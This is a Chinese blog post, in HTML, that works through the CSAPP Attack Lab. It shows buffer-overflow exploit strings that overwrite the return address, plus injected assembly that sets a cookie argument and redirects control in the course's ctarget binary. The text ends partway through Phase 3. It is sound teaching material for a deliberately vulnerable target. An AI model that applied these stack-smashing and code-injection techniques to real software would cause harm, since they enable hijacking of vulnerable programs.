<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg">
  <link rel="mask-icon" href="/images/avatar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":10,"offset":10,"onmobile":true},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="这是一场和计算机的邂逅.">
<meta property="og:type" content="article">
<meta property="og:title" content="CSAPP的lab3-attacklab">
<meta property="og:url" content="http://example.com/CSAPP/lab3/2024/02/27/index.html">
<meta property="og:site_name" content="Vite">
<meta property="og:description" content="这是一场和计算机的邂逅.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454085.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220621.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220772.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220816.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220855.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220891.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220929.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220967.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220002.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220043.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220099.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220164.png">
<meta property="article:published_time" content="2024-02-27T06:51:00.000Z">
<meta property="article:modified_time" content="2024-02-29T11:08:00.000Z">
<meta property="article:author" content="zhz_vite">
<meta property="article:tag" content="学习笔记">
<meta property="article:tag" content="csapp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png">

<link rel="canonical" href="http://example.com/CSAPP/lab3/2024/02/27/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CSAPP的lab3-attacklab | Vite</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Vite</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-study">

    <a href="/study/" rel="section"><i class="fa fa-anchor fa-fw"></i>不周山</a>

  </li>
        <li class="menu-item menu-item-create">

    <a href="/create/" rel="section"><i class="fa fa-sitemap fa-fw"></i>登天路</a>

  </li>
        <li class="menu-item menu-item-pure">

    <a href="/pure/" rel="section"><i class="fa fa-calendar fa-fw"></i>彼岸花</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/zhzvite" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/CSAPP/lab3/2024/02/27/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="zhz_vite">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vite">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CSAPP的lab3-attacklab
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-02-27 14:51:00" itemprop="dateCreated datePublished" datetime="2024-02-27T14:51:00+08:00">2024-02-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-02-29 19:08:00" itemprop="dateModified" datetime="2024-02-29T19:08:00+08:00">2024-02-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP/" itemprop="url" rel="index"><span itemprop="name">CSAPP</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/CSAPP/lab3/2024/02/27/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/CSAPP/lab3/2024/02/27/" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>45 分钟</span>
            </span>
            <div class="post-description">这是一场和计算机的邂逅.</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote>
<p>一个寒假没动,开学了,努努力把Attack Lab开盒了</p>
</blockquote>
<h1 id="Part-I-CI"><a href="#Part-I-CI" class="headerlink" title="Part I CI"></a>Part I CI</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><blockquote>
<p>CI: Code Injection Attacks</p>
</blockquote>
<p>测试下这个程序</p>
<p>注意我们在执行ctarget程序的时候默认是连接到cmu的服务器，但是我们不是cmu的学生所以连不上服务器也就无法执行代码，所以执行的时候要加命令行参数 -q 以阻止连接到服务器的行为。</p>
<p>输入以下命令运行ctarget</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ctarget -q</span><br></pre></td></tr></table></figure>

<p>(同理,用gdb ctarget时,要注意run要写成run -q,不然就会试图链接远程服务器,然后报以下错误)</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png" alt="image-20240229000718171"></p>
<p>随意的输入个string得知程序大致运行方式</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454085.png" alt="image-20240229000829319"></p>
<h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h2><p>然后我们在做实验之前一定要看的pdf文档告诉我们以下信息<br>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute<br>an existing procedure.<br>Function getbuf is called within CTARGET by a function test having the following C code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = <span class="built_in">getbuf</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution<br>within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,<br>there is code for a function touch1 having the following C representation:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch!: You called touch1()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">validate</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,<br>rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly<br>related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.<br>Some Advice:<br>• All the information you need to devise your exploit string for this level can be determined by exam-<br>ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.<br>• The idea is to position a byte representation of the starting address for touch1 so that the ret<br>instruction at the end of the code for getbuf will transfer control to touch1.<br>• Be careful about byte ordering.<br>• You might want to use GDB to step the program through the last few instructions of getbuf to make<br>sure it is doing the right thing.<br>• The placement of buf within the stack frame for getbuf depends on the value of compile-time<br>constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the<br>disassembled code to determine its position.</p>
<p>所以我们要把touch1的函数位置来覆盖getbuf的返回值以便执行touch1</p>
<p>先输入查看汇编代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt;ctarget.s</span><br></pre></td></tr></table></figure>

<p>Getbuf:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp;</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>

<p>Touch1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>0x28在十进制下2*16+8&#x3D;40个bytes,一个地址是8个bytes,所以我们想要在getbuf时跳转到touch1则需要缓冲区把原本的地址的位置(0x5561dca8)覆盖成0x004017c0,而那空余的四十个bytes想填啥填啥</p>
<p>即字节码为:(小端法,逆序存储)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>

<p>保存该文件为sol1.txt,然后把这个字节码转化成string,通过hex2raw命令(可以查看pdf文档的附录A),然后可以通过-i进行重定向输入,则完成Phase_1</p>
<p>输入命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol1.txt &gt;sol1r.txt</span><br><span class="line">gdb ctarget</span><br><span class="line">run -q -i sol1r.txt</span><br></pre></td></tr></table></figure>

<p>观察到以下信息则通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220621.png" alt="image-20240302013522137"></p>
<h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><p>照例读一遍官方pdf文档:</p>
<p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function <strong>touch2</strong> having the following C representation:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">2</span>;<span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.<code>你的任务是让CTARGET执行touch2的代码，而不是返回测试。但是，在这种情况下，您必须使它看起来像touch2一样，就像您已将cookie作为其参数传递一样。</code></p>
<p>Some Advice:<br>• You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.<code>您将希望以这样一种方式定位注入代码的地址的字节表示形式，即getbuf代码末尾的ret指令将控制权转移给它。</code><br>• Recall that the first argument to a function is passed in register %rdi.<code>回想一下，函数的第一个参数是在寄存器 % rdi中传递的。</code><br>• Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.<code>您注入的代码应将寄存器设置为您的cookie，然后使用ret指令将控制权转移到touch2中的第一个指令。</code><br>• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.<code>不要尝试在漏洞利用代码中使用jmp或调用指令。这些指令的目的地地址的编码难以公式化。对所有控制权转移使用ret指令，即使您没有从呼叫中返回。</code><br>• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequence<code>请参阅附录b中有关如何使用工具生成指令序列的字节级表示的讨论</code></p>
<p>touch2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>所以我要做的应该是把%rdi中的值变成cookie的值,这样在比较时便会通过.</p>
<p>知识扫盲:汇编语言中的ret指令是call指令的逆操作，它表示从子程序中返回到主程序。执行ret指令时，CPU会从堆栈中弹出上一个储存的PC值，并将其加载到PC寄存器中，程序就回到了主程序中继续执行。这时%rsp不会变化(如果没有其它命令的话)</p>
<p>需完成操作:</p>
<ul>
<li><p>将cookie(0x59b997fa中的值推送到%rdi中</p>
</li>
<li><p>将touch2的地址push到栈中</p>
</li>
<li><p>ret,取到touch2的地址</p>
</li>
</ul>
<p>根据以上操作写出汇编代码,保存该代码为t2.s文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>接下来我们要得到机器代码(编译再反汇编得到机器代码指令)</p>
<p>输入以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -Og t2.s</span><br><span class="line">objdump -d t2.o&gt;t2.txt</span><br></pre></td></tr></table></figure>

<p>可以得到汇编代码的机器指令:</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220772.png" alt="image-20240302014356466"></p>
<p>然后通过gdb挑选一个注入代码的位置,这里我们选择getbuf中的$rsp栈顶作为代码注入位置,通过gdb命令,打一个在getbuf的断点,探测到rsp的地址,即栈顶地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png" alt="image-20240229135832513"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p $rsp=0x5561dc78</span><br></pre></td></tr></table></figure>

<p>这样我们就可以开始编我们的进攻序列,在缓冲区中存放进攻指令,覆盖的地址填原来的栈顶,即在0x5561dc78注入代码进行进攻</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220816.png" alt="image-20240302014950119"></p>
<p>覆盖的地址要依照小端法逆序,而机器指令不用逆序,中间填充字符,当然可以考虑换一个代码注入位置.编完后我们要用hex2raw来转换进攻字节以便于生成进攻字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol2.txt&gt;sol2r.txt</span><br><span class="line">./ctarget -q -i sol2r.txt</span><br></pre></td></tr></table></figure>

<p>然后提交会得到以下结果,圆满过关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220855.png" alt="image-20240302014929043"></p>
<p>或者我们可以选择不在那里注入代码,我们选择在test的栈帧内注入代码,即在0x5561dca8段注入代码!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220891.png" alt="image-20240302015226085"></p>
<p>理论成立,实践开始!</p>
<p>圆满通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220929.png" alt="image-20240302015316019"></p>
<h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h2><p>看一下官方文档:</p>
<p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p>
<p>touch3 C &amp;&amp; Assembly Code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch3</span><span class="params">(<span class="type">char</span> \*sval)</span></span>&#123;</span><br><span class="line">vlevel = <span class="number">3</span>; <span class="comment">/*Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span 